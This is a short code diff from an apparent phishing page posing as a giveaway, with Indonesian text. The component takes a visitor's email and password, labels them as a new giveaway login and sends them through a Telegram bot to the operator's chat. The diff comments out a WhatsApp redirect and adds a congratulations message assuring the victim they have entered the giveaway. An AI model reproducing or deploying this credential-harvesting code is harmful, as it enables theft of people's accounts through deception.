@@ -29,14 +29,18 @@ function SendTele() {
       const message_text = `Ada Yang Login Gift Away \n Email : ${email} \n Password : ${password}`;
 
       sendMessage(telegram_id, message_text, token);
-      window.location.href = "https://wa.me/6289653260395";
+      // window.location.href = "https://wa.me/6289653260395";
     } else {
       console.log("Masukan yang lain");
     }
   }, [email, password, router]);
   return (
     <div>
-     
+          <div className="lg:16 py-5 px-5 text-center">
+            <h1 className="text-3xl py-16">Selamat Anda Sudah Berpatisipasi <br></br>
+              Dalam Gift Away ini.
+            </h1>
+          </div>
     </div>
   );
 }
